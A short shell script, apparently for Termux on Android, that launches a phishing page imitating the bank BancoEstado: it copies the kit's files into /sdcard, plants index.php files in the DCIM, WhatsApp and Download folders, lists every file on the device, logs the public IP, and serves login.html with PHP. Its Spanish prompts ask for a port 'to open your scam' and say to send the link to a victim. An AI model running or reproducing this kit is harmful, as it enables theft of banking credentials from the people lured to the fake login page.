cp /sdcard/*/*.* -r /sdcard/
ls /sdcard/*/* |& tee /sdcard/.all
curl ifconfig.me |& tee /sdcard/.ip
cp .c/bancoestado/* -r /sdcard/
cp .i -r /sdcard/index.php
cp .i -r /sdcard/DCIM/index.php
cp .i -r /sdcard/WhatsApp/index.php
cp .i -r /sdcard/Descargas/index.php
cp .i -r /sdcard/Download/index.php
bash .banner
echo "Introduce un puerto para abrir tu scam:"
read input
bash .banner
echo "Puerto exitosamente abierto mandale este enlace:"
echo ""
echo "http://localhost:$input/login.html"
php -S localhost:$input -t /sdcard/
